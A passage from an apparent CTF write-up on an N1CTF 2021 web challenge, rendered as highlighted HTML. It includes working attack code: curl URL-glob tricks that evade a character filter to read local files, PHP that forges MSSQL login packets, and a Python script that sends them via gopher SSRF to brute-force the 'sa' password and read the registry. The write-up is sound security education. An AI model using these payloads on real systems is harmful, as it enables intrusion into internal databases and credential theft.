+You can specify multiple URLs <span class="hljs-keyword">or</span> parts <span class="hljs-keyword">of</span> URLs <span class="hljs-keyword">by</span> writing part sets <span class="hljs-keyword">within</span> braces <span class="hljs-keyword">and</span> quoting <span class="hljs-keyword">the</span> <span class="hljs-built_in">URL</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">in</span>:
+
+  <span class="hljs-string">&quot;http://site.{one,two,three}.com&quot;</span>
+<span class="hljs-keyword">or</span> you can <span class="hljs-built_in">get</span> sequences <span class="hljs-keyword">of</span> alphanumeric series <span class="hljs-keyword">by</span> <span class="hljs-keyword">using</span> [] <span class="hljs-keyword">as</span> <span class="hljs-keyword">in</span>:
+
+  <span class="hljs-string">&quot;ftp://ftp.example.com/file[1-100].txt&quot;</span>
+  <span class="hljs-string">&quot;ftp://ftp.example.com/file[001-100].txt&quot;</span>    (<span class="hljs-keyword">with</span> leading zeros)
+  <span class="hljs-string">&quot;ftp://ftp.example.com/file[a-z].txt&quot;</span>
+Nested sequences are <span class="hljs-keyword">not</span> supported, but you can use several ones next <span class="hljs-built_in">to</span> <span class="hljs-keyword">each</span> other:
+
+  <span class="hljs-string">&quot;http://example.com/archive[1996-1999]/vol[1-4]/part{a,b,c}.html&quot;</span></code></pre><p>Here, my teammate suggested a method to bypass the strpos check at the bottom of the source code by sending like the following parameter.</p>
+<pre class="hljs"><code><span class="hljs-attribute">url</span>={http://<span class="hljs-number">127.0.0.1</span>/,<span class="hljs-number">08</span>b<span class="hljs-number">788</span>c<span class="hljs-number">8</span>-c<span class="hljs-number">7</span>f<span class="hljs-number">4</span>-<span class="hljs-number">885</span>d-d<span class="hljs-number">4</span>d<span class="hljs-number">0</span>-<span class="hljs-number">78</span>f<span class="hljs-number">89</span>fb<span class="hljs-number">8</span>c<span class="hljs-number">766</span>}</code></pre><p>The problem he had was that we wanted to load <code>file:///hint</code>, but the character <code>l</code> was blocked by the regex check.</p>
+<img src=//harold.kim/static/blog/n1ctf-web-5.png>
+
+<p>Looking back at the curl&#39;s official documentation, I found that we can still utilize <code>[a-z]</code> and bypass the character check easily.</p>
+<p>For example, <code>fi[j-m]e:///{hint.txt,47ac392a-46d9-522d-b854-1af5fb248eba}</code> will eventually load all URLs from the following locations.</p>
+<ul class="list">
+<li><code>fije:///hint.txt</code></li>
+<li><code>fije:///{uuid}</code></li>
+<li><code>file:///hint.txt</code></li>
+<li><code>file:///{uuid}</code></li>
+<li><code>fime:///hint.txt</code></li>
+<li><code>fime:///{uuid}</code></li>
+</ul>
+<pre class="hljs"><code>47ac392a-46d9-522d-b854-1af5fb248eba&lt;<span class="hljs-string">/br</span>&gt;
+your <span class="hljs-keyword">command</span>: <span class="hljs-string">/usr/bin/curl</span> &#x27;fi[j-m]e:<span class="hljs-string">///</span>{hint.txt,47ac392a-46d9-522d-b854-1af5fb248eba}&#x27; <span class="hljs-params">--output</span> - -m 3 <span class="hljs-params">--connect-timeout</span> 3&lt;<span class="hljs-string">/br</span>&gt;
+<span class="hljs-params">--_curl_--fije</span>:<span class="hljs-string">///hint.txt</span>
+<span class="hljs-params">--_curl_--fije</span>:<span class="hljs-string">///47ac392a-46d9-522d-b854-1af5fb248eba</span>
+<span class="hljs-params">--_curl_--fike</span>:<span class="hljs-string">///hint.txt</span>
+<span class="hljs-params">--_curl_--fike</span>:<span class="hljs-string">///47ac392a-46d9-522d-b854-1af5fb248eba</span>
+<span class="hljs-params">--_curl_--file</span>:<span class="hljs-string">///hint.txt</span>
+mssql_host：10.11.22.9
+mssql_port：1433
+mssql_username：sa
+mssql_password in <span class="hljs-string">/password.txt</span>
+flag in HKEY_LOCAL_MACHINE\SOFTWARE\N1CTF2021
+<span class="hljs-params">--_curl_--file</span>:<span class="hljs-string">///47ac392a-46d9-522d-b854-1af5fb248eba</span>
+<span class="hljs-params">--_curl_--fime</span>:<span class="hljs-string">///hint.txt</span>
+<span class="hljs-params">--_curl_--fime</span>:<span class="hljs-string">///47ac392a-46d9-522d-b854-1af5fb248eba</span></code></pre><p>I assumed that the content of <code>password.txt</code> would be simple but... it was a long list of UUID-like passwords in it.</p>
+<p>This implies that we also need to bruteforce the password to get into the server.</p>
+<img src=//harold.kim/static/blog/n1ctf-web-6.png>
+
+
+<p>Now, the next step would be accessing MSSQL server, which took the longest time amongst all other web challenges.</p>
+<p>Unfortunately, we only could find two resources that were useful to achieve SSRF on MSSQL.</p>
+<ol class="list">
+<li>impacket&#39;s MSSQL (<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py</a>)</li>
+<li>35C3 Post Writeup (<a href="https://ctftime.org/writeup/12808">https://ctftime.org/writeup/12808</a>)</li>
+</ol>
+<p>My initial decision was to port all impacket&#39;s MSSQL interface and craft packets.</p>
+<p>I actually finished porting all of these codes but it didn&#39;t seem to work properly.</p>
+<pre class="hljs"><code>root@stypr-jpn:~/aaa/funny<span class="hljs-comment"># cat craft.py</span>
+...
+...
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    <span class="hljs-comment"># 10.11.22.9 , 1443, sa</span>
+    <span class="hljs-comment"># HKEY_LOCAL_MACHINE\SOFTWARE\N1CTF2021</span>
+    <span class="hljs-built_in">print</span>(prelogin())
+    <span class="hljs-comment"># def login(server, database, username, password=&#x27;&#x27;, domain=&#x27;&#x27;, hashes = None, useWindowsAuth = False):</span>
+    <span class="hljs-built_in">print</span>(login(<span class="hljs-string">&#x27;10.11.22.9&#x27;</span>, <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;sa&#x27;</span>, password=<span class="hljs-string">&#x27;123456&#x27;</span>))
+    <span class="hljs-built_in">print</span>(exec_query(<span class="hljs-string">&quot;SELECT 1337&quot;</span>)) <span class="hljs-comment"># Note: 2 bytes needs to be added on top of it, gopher adds \r\n</span>
+
+root@stypr-jpn:~/aaa/funny<span class="hljs-comment"># python3 craft.py </span>
+<span class="hljs-string">b&#x27;\x12\x01\x00/\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1b\x00\x01\x02\x00\x1c\x00\x07\x03\x00#\x00\x04\xff\x08\x00\x01U\x00\x00\x00mssql5\x00\x93\xe0\x00\x00&#x27;</span>
+<span class="hljs-string">b&quot;\x10\x01\x00\xb2\x00\x00\x01\x00\xaa\x00\x00\x00\x00\x00\x00q\xfb\x7f\x00\x00\x00\x00\x00\x07&#x27;\x00\x00\x00\x00\x00\x00\x00\xe0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00V\x00\x08\x00f\x00\x02\x00j\x00\x06\x00v\x00\x08\x00\x86\x00\n\x00\x00\x00\x00\x00\x9a\x00\x08\x00\xaa\x00\x00\x00\xaa\x00\x00\x00\x01\x02\x03\x04\x05\x06\xaa\x00\x00\x00\xaa\x00\x00\x00S\x00K\x00W\x00j\x00y\x00c\x00t\x00m\x00s\x00a\x00\xb6\xa5\x86\xa5\x96\xa5\xe6\xa5\xf6\xa5\xc6\xa5R\x00O\x00w\x00T\x00D\x00E\x00K\x00z\x001\x000\x00.\x001\x001\x00.\x002\x002\x00.\x009\x00R\x00O\x00w\x00T\x00D\x00E\x00K\x00z\x00&quot;</span>
+<span class="hljs-string">b&#x27;\x01\x01\x00(\x00\x00\x01\x00S\x00E\x00L\x00E\x00C\x00T\x00 \x001\x003\x003\x007\x00;\x00-\x00-\x00 \x00-\x00&#x27;</span></code></pre><p>... Later I realized that impacket&#39;s MSSQL client didn&#39;t work properly on some of latest SQL servers. I wasted a lot of time from doing this.</p>
+<p>But on the other hand, I learnt how MSSQL authentication protocol works. From here, I decided to just manually modify packets from 35C3&#39;s exploit code and craft packets.</p>
+<p>Since the password length is the same in the <code>password.txt</code>, all I needed is to capture a valid authentication packet with the password of same length. As we see on the sourcecode below, <code>encryptPassword</code> does not change the length so you don&#39;t need to change password offsets from the header data.</p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-comment">// Ported from impacket&#x27;s encryptPassword.</span>
+<span class="hljs-comment">// As you see, encrypting password does not change the size, so it is much easier to craft the packet.</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encryptPassword</span>(<span class="hljs-params"><span class="hljs-variable">$password</span></span>)</span>{
+    <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;
+    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$password</span>);<span class="hljs-variable">$i</span>++){
+        <span class="hljs-variable">$tmp</span> = ord(<span class="hljs-variable">$password</span>[<span class="hljs-variable">$i</span>]);
+        <span class="hljs-comment">// echo $tmp;</span>
+        <span class="hljs-variable">$tmp</span> = (((<span class="hljs-variable">$tmp</span> &amp; <span class="hljs-number">0x0f</span>) &lt;&lt; <span class="hljs-number">4</span>) + ((<span class="hljs-variable">$tmp</span> &amp; <span class="hljs-number">0xf0</span>) &gt;&gt; <span class="hljs-number">4</span>)) ^ <span class="hljs-number">0xa5</span>;
+        <span class="hljs-variable">$result</span> .= chr(<span class="hljs-variable">$tmp</span>);
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;
+}
+
+<span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;sa&quot;</span>;
+<span class="hljs-variable">$password</span> = <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]; <span class="hljs-comment">// &quot;d0e7a7fa-6b75-4998-a87d-736170a03110&quot;;</span>
+<span class="hljs-variable">$username</span> = mb_convert_encoding(<span class="hljs-variable">$username</span>, <span class="hljs-string">&quot;utf-16le&quot;</span>);
+<span class="hljs-variable">$password</span> = mb_convert_encoding(<span class="hljs-variable">$password</span>, <span class="hljs-string">&quot;utf-16le&quot;</span>);
+<span class="hljs-variable">$password</span> = encryptPassword(<span class="hljs-variable">$password</span>);
+<span class="hljs-variable">$password_len</span> = strlen(<span class="hljs-variable">$password</span>) / <span class="hljs-number">2</span>;
+<span class="hljs-variable">$password_len</span> = chr(dechex(<span class="hljs-variable">$password_len</span>));
+
+<span class="hljs-comment">// From 35C3&#x27;s Post Challenge</span>
+<span class="hljs-variable">$prelogin_packet</span>  = <span class="hljs-string">&quot;\x12\x01\x00\x2f\x00\x00\x01\x00&quot;</span>;
+<span class="hljs-variable">$prelogin_packet</span> .= <span class="hljs-string">&quot;\x00\x00\x1a\x00\x06\x01\x00\x20&quot;</span>;
+<span class="hljs-variable">$prelogin_packet</span> .= <span class="hljs-string">&quot;\x00\x01\x02\x00\x21\x00\x01\x03&quot;</span>;
+<span class="hljs-variable">$prelogin_packet</span> .= <span class="hljs-string">&quot;\x00\x22\x00\x04\x04\x00\x26\x00&quot;</span>;
+<span class="hljs-variable">$prelogin_packet</span> .= <span class="hljs-string">&quot;\x01\xff\x00\x00\x00\x01\x00\x01&quot;</span>;
+<span class="hljs-variable">$prelogin_packet</span> .= <span class="hljs-string">&quot;\x02\x00\x00\x00\x00\x00\x00&quot;</span>;
+
+<span class="hljs-comment">// Login Packet</span>
+<span class="hljs-comment">// All you need is to find the offset of the password, and replace the packet data with our input.</span>
+<span class="hljs-variable">$login_packet</span> = hex2bin(<span class="hljs-string">&quot;1001010b0000010003010000040000740010000000000000939f000000000000f0000008e0010000090400005e0006006a0002006e002400b6000a00ca000900dc000400e1000700ef000a0003010000010203040506030100000301000003010000000000007500620075006e007400750073006100&quot;</span>);
+<span class="hljs-variable">$login_packet</span> .= <span class="hljs-variable">$password</span>;
+<span class="hljs-variable">$login_packet</span> .= hex2bin(<span class="hljs-string">&quot;6e006f00640065002d006d007300730071006c006c006f00630061006c0068006f0073007400e0000000ff54006500640069006f0075007300750073005f0065006e0067006c00690073006800&quot;</span>);
+
+<span class="hljs-comment">// Sending Query</span>
+<span class="hljs-comment">// This may not be stable sometimes so make sure to adjust your packets a bit.</span>
+<span class="hljs-variable">$query</span> = <span class="hljs-variable">$argv</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&quot;;-- -&quot;</span>;
+<span class="hljs-variable">$query</span> = mb_convert_encoding(<span class="hljs-variable">$query</span>, <span class="hljs-string">&quot;utf-16le&quot;</span>);
+<span class="hljs-variable">$length</span> = strlen(<span class="hljs-variable">$query</span>) + <span class="hljs-number">30</span> + <span class="hljs-number">2</span>;
+<span class="hljs-variable">$query_packet</span>  = <span class="hljs-string">&quot;\x01\x01&quot;</span> . pack(<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-variable">$length</span>) . <span class="hljs-string">&quot;\x00\x00\x01\x00&quot;</span>;
+<span class="hljs-variable">$query_packet</span> .= <span class="hljs-string">&quot;\x16\x00\x00\x00\x12\x00\x00\x00&quot;</span>;
+<span class="hljs-variable">$query_packet</span> .= <span class="hljs-string">&quot;\x02\x00\x00\x00\x00\x00\x00\x00&quot;</span>;
+<span class="hljs-variable">$query_packet</span> .= <span class="hljs-string">&quot;\x00\x00\x01\x00\x00\x00&quot;</span>;
+<span class="hljs-variable">$query_packet</span> .= <span class="hljs-variable">$query</span>;
+
+<span class="hljs-variable">$payload</span> = <span class="hljs-variable">$prelogin_packet</span> . <span class="hljs-variable">$login_packet</span> . <span class="hljs-variable">$query_packet</span>;
+<span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span> . str_replace(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;%20&quot;</span>,urlencode(<span class="hljs-variable">$payload</span>)) . <span class="hljs-string">&quot;&quot;</span>;
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;
+<span class="hljs-comment">// system(&quot;curl &#x27;$result&#x27;  --output - -m 3 --connect-timeout 3&quot;);</span>
+
+<span class="hljs-meta">?&gt;</span></code></pre><p>With this, we can now bruteforce for passwords in SQL Server.</p>
+<p>As already described in the hint, it is possible to retrieve the secret information by reading registry. so executing <code>master.sys.xp_regenumvalues</code> will populate the flag.</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> requests
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_password</span>():</span>
+    <span class="hljs-string">&quot;&quot;&quot; Leaks the content of file:///password.txt &quot;&quot;&quot;</span>
+    <span class="hljs-built_in">hash</span> = <span class="hljs-string">&quot;7b3ba344-2974-c748-8558-102060de0902&quot;</span>
+    d = {
+        <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;fi[j-m]e:///{password.txt,&quot;</span>+<span class="hljs-built_in">hash</span>+<span class="hljs-string">&quot;}&quot;</span>
+    }
+    h = {
+        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=rhi443hsuiglkntgqf7vgdpf8l&quot;</span>,
+        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>
+    }
+    <span class="hljs-comment"># print(requests.post(&quot;https://fo.ax/f.php&quot;,  data=d, headers=h).text)</span>
+    r = requests.post(<span class="hljs-string">&quot;http://129.226.12.144/index.php&quot;</span>, headers=h, data=d)
+    <span class="hljs-built_in">print</span>(r.headers)
+    <span class="hljs-keyword">return</span> r.text
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ssrf_bruteforce</span>():</span>
+    <span class="hljs-string">&quot;&quot;&quot; Bruteforce for the password &quot;&quot;&quot;</span>
+    <span class="hljs-comment"># Password is 32367d71-af9b-4996-852f-f5566c13971a</span>
+
+    password_list = []
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;password.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:
+        password_list = [i.strip() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.read().split() <span class="hljs-keyword">if</span> i]
+
+    <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> password_list:
+        _res = os.popen(<span class="hljs-string">f&quot;php gen_payload.php <span class="hljs-subst">{password}</span> \&quot;SELECT &#x27;ASDFASDF&#x27;\&quot;&quot;</span>).read()
+        <span class="hljs-comment"># This is to bypass the l, g</span>
+        _res = _res.replace(<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;%6C&quot;</span>).replace(<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;%67&quot;</span>)
+        _res = _res.replace(<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;%4C&quot;</span>).replace(<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;%47&quot;</span>)
+
+        <span class="hljs-built_in">hash</span> = <span class="hljs-string">&quot;7b3ba344-2974-c748-8558-102060de0902&quot;</span>
+        d = {<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;[f-h]opher://10.11.22.9:1433/A{&quot;</span>+_res+<span class="hljs-string">&quot;,&quot;</span>+<span class="hljs-built_in">hash</span>+<span class="hljs-string">&quot;}&quot;</span>}
+        h = {
+            <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=rhi443hsuiglkntgqf7vgdpf8l&quot;</span>,
+            <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>
+        }
+        r = requests.post(<span class="hljs-string">&quot;http://129.226.12.144/index.php&quot;</span>, headers=h, data=d)
+        <span class="hljs-built_in">print</span>(r.headers)
+        t = r.text
+        <span class="hljs-comment"># Check if invalid authentication message does not exist</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;\x00\x69\x00\x6c\x00\x65\x00\x64\x00\x20\x00\x66\x00\x6f\x00\x72&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> t:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;</span> + password)
+            exit(<span class="hljs-number">0</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ssrf_run_cmd</span>():</span>
+    password = <span class="hljs-string">&quot;32367d71-af9b-4996-852f-f5566c13971a&quot;</span>
+    _res = os.popen(<span class="hljs-string">f&quot;php gen_payload.php <span class="hljs-subst">{password}</span> \&quot;EXECUTE master.sys.xp_regenumvalues &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;Software\\N1CTF2021&#x27;\&quot;&quot;</span>).read()
+    <span class="hljs-comment">#  _res = os.popen(f&quot;php gen_payload.php {password} \&quot;EXECUTE master.sys.xp_regread &#x27;AAAAAAAAAAAAAAAAAAAAA&#x27;\&quot;&quot;).read()</span>
+    <span class="hljs-comment"># This is to bypass the l, g</span>
+    _res = _res.replace(<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;%6C&quot;</span>).replace(<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;%67&quot;</span>)
+    _res = _res.replace(<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;%4C&quot;</span>).replace(<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;%47&quot;</span>)
+
+    <span class="hljs-built_in">hash</span> = <span class="hljs-string">&quot;7b3ba344-2974-c748-8558-102060de0902&quot;</span>
+    d = {<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;[f-h]opher://10.11.22.9:1433/A{&quot;</span>+_res+<span class="hljs-string">&quot;,&quot;</span>+<span class="hljs-built_in">hash</span>+<span class="hljs-string">&quot;}&quot;</span>}
+    h = {
+        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=rhi443hsuiglkntgqf7vgdpf8l&quot;</span>,
+        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>
+    }
+    r = requests.post(<span class="hljs-string">&quot;http://129.226.12.144/index.php&quot;</span>, headers=h, data=d)
+    t = r.text
+    <span class="hljs-keyword">return</span> t
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    <span class="hljs-comment"># print(leak_password())</span>
+    <span class="hljs-comment"># print(ssrf_bruteforce())</span>
+    <span class="hljs-built_in">print</span>(ssrf_run_cmd())
+</code></pre><p>Running the script will populate the flag from the registry.</p>
+<pre class="hljs"><code>...
+--_curl<span class="hljs-number">_</span>--fopher://<span class="hljs-number">10.11</span>.<span class="hljs-number">22.9</span>:<span class="hljs-number">1433</span>/Ad93152cc-<span class="hljs-number">1</span>a4d-<span class="hljs-number">877</span>b-e0ba-d1748ca3ae4e
+--_curl<span class="hljs-number">_</span>--gopher://<span class="hljs-number">10.11</span>.<span class="hljs-number">22.9</span>:<span class="hljs-number">1433</span>/A<span class="hljs-meta">%12</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%2F</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%1A</span><span class="hljs-meta">%00</span><span class="hljs-meta">%06</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%20</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%02</span><span class="hljs-meta">%00</span><span class="hljs-meta">%21</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%03</span><span class="hljs-meta">%00</span><span class="hljs-meta">%22</span><span class="hljs-meta">%00</span><span class="hljs-meta">%04</span><span class="hljs-meta">%04</span><span class="hljs-meta">%00</span><span class="hljs-meta">%26</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%02</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%10</span><span class="hljs-meta">%01</span><span class="hljs-meta">%01</span><span class="hljs-meta">%0B</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%03</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%04</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00t</span><span class="hljs-meta">%00</span><span class="hljs-meta">%10</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%93</span><span class="hljs-meta">%9F</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%F0</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%08</span><span class="hljs-meta">%E0</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%09</span><span class="hljs-meta">%04</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%5E</span><span class="hljs-meta">%00</span><span class="hljs-meta">%06</span><span class="hljs-meta">%00j</span><span class="hljs-meta">%00</span><span class="hljs-meta">%02</span><span class="hljs-meta">%00n</span><span class="hljs-meta">%00</span><span class="hljs-meta">%24</span><span class="hljs-meta">%00</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%00</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%00</span><span class="hljs-meta">%CA</span><span class="hljs-meta">%00</span><span class="hljs-meta">%09</span><span class="hljs-meta">%00</span><span class="hljs-meta">%DC</span><span class="hljs-meta">%00</span><span class="hljs-meta">%04</span><span class="hljs-meta">%00</span><span class="hljs-meta">%E1</span><span class="hljs-meta">%00</span><span class="hljs-meta">%07</span><span class="hljs-meta">%00</span><span class="hljs-meta">%EF</span><span class="hljs-meta">%00</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%00</span><span class="hljs-meta">%03</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%02</span><span class="hljs-meta">%03</span><span class="hljs-meta">%04</span><span class="hljs-meta">%05</span><span class="hljs-meta">%06</span><span class="hljs-meta">%03</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%03</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%03</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00u</span><span class="hljs-meta">%00b</span><span class="hljs-meta">%00u</span><span class="hljs-meta">%00n</span><span class="hljs-meta">%00t</span><span class="hljs-meta">%00u</span><span class="hljs-meta">%00s</span><span class="hljs-meta">%00a</span><span class="hljs-meta">%00</span><span class="hljs-meta">%96</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%86</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%96</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%C6</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%D6</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%D6</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%A5w</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%B3</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%C3</span><span class="hljs-meta">%A56</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%83</span><span class="hljs-meta">%A5w</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%A56</span><span class="hljs-meta">%A56</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%C6</span><span class="hljs-meta">%A5w</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%26</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%F6</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%86</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%C3</span><span class="hljs-meta">%A5w</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%C3</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%F6</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%F6</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%C6</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%C6</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%93</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%96</span><span class="hljs-meta">%A56</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%D6</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%B3</span><span class="hljs-meta">%A5n</span><span class="hljs-meta">%00o</span><span class="hljs-meta">%00d</span><span class="hljs-meta">%00e</span><span class="hljs-meta">%00-</span><span class="hljs-meta">%00m</span><span class="hljs-meta">%00s</span><span class="hljs-meta">%00s</span><span class="hljs-meta">%00q</span><span class="hljs-meta">%00</span><span class="hljs-meta">%6C</span><span class="hljs-meta">%00</span><span class="hljs-meta">%6C</span><span class="hljs-meta">%00o</span><span class="hljs-meta">%00c</span><span class="hljs-meta">%00a</span><span class="hljs-meta">%00</span><span class="hljs-meta">%6C</span><span class="hljs-meta">%00h</span><span class="hljs-meta">%00o</span><span class="hljs-meta">%00s</span><span class="hljs-meta">%00t</span><span class="hljs-meta">%00</span><span class="hljs-meta">%E0</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%FFT</span><span class="hljs-meta">%00e</span><span class="hljs-meta">%00d</span><span class="hljs-meta">%00i</span><span class="hljs-meta">%00o</span><span class="hljs-meta">%00u</span><span class="hljs-meta">%00s</span><span class="hljs-meta">%00u</span><span class="hljs-meta">%00s</span><span class="hljs-meta">%00_</span><span class="hljs-meta">%00e</span><span class="hljs-meta">%00n</span><span class="hljs-meta">%00</span><span class="hljs-meta">%67</span><span class="hljs-meta">%00</span><span class="hljs-meta">%6C</span><span class="hljs-meta">%00i</span><span class="hljs-meta">%00s</span><span class="hljs-meta">%00h</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%C4</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%16</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%12</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%02</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span 